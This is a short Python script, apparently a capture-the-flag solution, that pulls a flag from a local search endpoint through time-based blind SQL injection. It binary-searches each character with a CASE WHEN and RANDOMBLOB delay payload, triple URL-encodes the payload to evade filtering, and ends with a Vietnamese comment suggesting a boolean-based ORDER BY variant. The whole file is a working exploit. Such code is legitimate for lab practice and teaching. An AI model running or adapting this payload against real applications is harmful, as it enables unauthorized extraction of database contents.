import requests

url = "http://localhost:5002/search?by="

s = requests.Session()

def send(payload):
    r = s.get(url + payload)
    time = r.elapsed.total_seconds()
    return True if time > 2 else False
    
def encode(payload):
    return "".join((f"%{ord(c):02x}" for c in payload))

FLAG = ""
for i in range(1,16):
    l ,r = 0, 128
    while l<r:
        mid = (l+r+1)//2
        payload = f"(select case when (unicode(substr((select flag from flag),{i},1))>={mid}) then RANDOMBLOB(444444444/2) else 1 end)"
        payload = encode(encode(encode(payload)))
        if send(payload):
            l = mid
        else:
            r = mid - 1
        print(f"Bruteforcing index: {i} - trying character: {chr(mid)}", end="\r")
    FLAG += chr(l)
print(f"\nFLAG: {FLAG}")

# Ngoài sử dụng time-based ta cũng có thể dựa vào response để làm tín hiệu và sử dụng boolean-based
# (ép order by trả về thứ tự sắp xếp theo ý muốn và dùng nó làm tín hiệu)